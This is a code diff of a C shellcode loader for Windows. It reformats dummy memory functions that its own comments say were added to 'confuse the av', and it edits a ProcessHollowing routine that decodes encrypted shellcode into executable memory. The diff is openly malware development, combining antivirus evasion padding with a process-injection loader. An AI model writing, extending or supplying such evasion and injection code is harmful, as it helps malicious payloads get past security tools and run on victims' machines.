@@ -46,36 +46,29 @@ int hex_decode(const char* hex, unsigned char* output) {
     return len / 2;
 }
 
+
 // 3 Fake functions to initialize memory and stuff, maybe could confuse the av idk
 void init_memory(void* ptr, size_t size) {
     unsigned char* p = (unsigned char*)ptr;
     for (size_t i = 0; i < size; i++) {
-        p[i] = 0;
-    }
-}
-
+        p[i] = 0; } }
 // Obfuscated malloc function with no-op variable
 void *malloc_obfuscated(size_t size) {
     void *ptr = malloc(size);
     int no_op_var = 42; // Irrelevant var
-    no_op_var++;  // No-op
+    no_op_var++;
     if (ptr) {
-        init_memory(ptr, size);
-    }
-    return ptr;
-}
-
+        init_memory(ptr, size); }
+    return ptr; }
 // Obfuscated function with redundant check
 void free_obfuscated(void *ptr) {
     if (ptr) {
         unsigned char* p = (unsigned char*)ptr;
-        size_t len = 100;  // Random length
+        size_t len = 100;
         for (size_t i = 0; i < len; i++) {
-            p[i] = p[i];
-        }
-        free(ptr);
-    }
-}
+            p[i] = p[i]; }
+        free(ptr); } }
+
 
 // The shellcode here is the encrytped messagebox shellcode from the previous code
 void ProcessHollowing() {
@@ -109,8 +102,6 @@ void ProcessHollowing() {
         free_obfuscated(base64_decoded);
         return;
     }
-
-    // Allocate memory for the shellcode in the target process
     LPVOID allocated_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (allocated_mem == NULL) {
         printf("Failed to allocate memory: %d\n", GetLastError());
